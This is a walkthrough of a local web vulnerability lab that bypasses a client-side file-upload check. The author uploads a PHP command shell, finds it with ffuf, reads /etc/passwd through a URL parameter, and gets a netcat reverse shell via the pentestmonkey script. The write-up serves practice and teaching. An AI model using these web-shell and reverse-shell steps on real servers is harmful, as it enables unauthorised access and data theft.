# Insecure File Upload - Basic Bypass

- When I arrived at the website, I discovered a section dedicated to uploading files.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/d5cbe3a2-4aaa-4535-b336-98f8d57ee180)

- During my testing, I attempted to upload a text file, but I encountered a restriction stating that only PNG and JPG files are permitted for uploading.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/d7d868bf-26bc-4d31-ab81-4f077aac26d8)

- Once again, I attempted to upload the file to observe if any requests were sent to the server. However, after I looked it over, I did not see any requests being made during the upload process.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/1c781bad-d29f-4b42-9d63-17504129ac1f)

- I repeated the process of uploading a PNG file and intercepted the corresponding request using Burp Suite for analysis.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/fb4121b3-103b-4290-b836-7fe5d38ac7a5)

- After sending the request to the repeater in Burp Suite, I proceeded to make some minor modifications to the request in an attempt to achieve my goal. I changed the file name extension from "png" to "txt" and removed the image data. Instead, I inserted the text "Hello" in its place.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/e2015bbf-a607-4723-9366-d1477792aeb1)

- Following the successful modification of the request, I refreshed the browser page to verify if the file was indeed uploaded.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/5fa3786f-9a4d-4728-906a-1d4d35f4864a)

- This time I used a PHP cmd to extract the data from the server. For this, I have changed the filename and inserted the PHP command.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/73dc4603-c050-464e-9c5a-72b757c27ca3)


- In my attempt to locate the uploaded file folder, I utilized the tool "ffuf." Through this process, I successfully discovered an "upload" folder located under the "labs" directory.

```bash
└─$ ffuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/labs/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 56ms]
    * FUZZ: .htaccess

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 100ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 153ms]
    * FUZZ: .hta

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 197ms]
    * FUZZ: 

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
    * FUZZ: uploads

:: Progress: [4614/4614] :: Job [1/1] :: 46 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- Upon navigating to the discovered "upload" folder under the "labs" directory, I obtained the following output:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/cae49e62-5127-4e30-9bf7-bfcd84456367)

- To get the desired output, I need to send a command with argument, so I tried with this command in the URL:
- cmd: `http://localhost/labs/uploads/cmd.php?cmd=whoami`

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/d8948a76-112e-414f-809d-54c483d2e1f0)

- I am also able to fetch the passwd file by using command: `http://localhost/labs/uploads/cmd.php?cmd=cat /etc/passwd`

 ![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/a920f6d3-cb03-4599-8d49-03c7cf64ad4b)

- To improve the view I switched to the page source.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/b37a7da5-0231-4852-9e4a-20c0f179375a)

- I am also able to get a reverse shell to my system by using the [pentest-monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) PHP reverse shell script.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/7ff235b7-fb4b-47c1-beb1-64f1d29e80e3)

- After setting the Netcat listening server and navigating to the file I am indeed successful in getting the reverse shell back to my system.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/9f460a22-04a6-4f2d-bbf6-d2b2cfe11ff3)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.xxx] from (UNKNOWN) [17x.xxx.xx.x] 34670
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 05:22:07 up  1:52,  0 users,  load average: 1.35, 1.32, 0.92
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

### Task Accomplished!
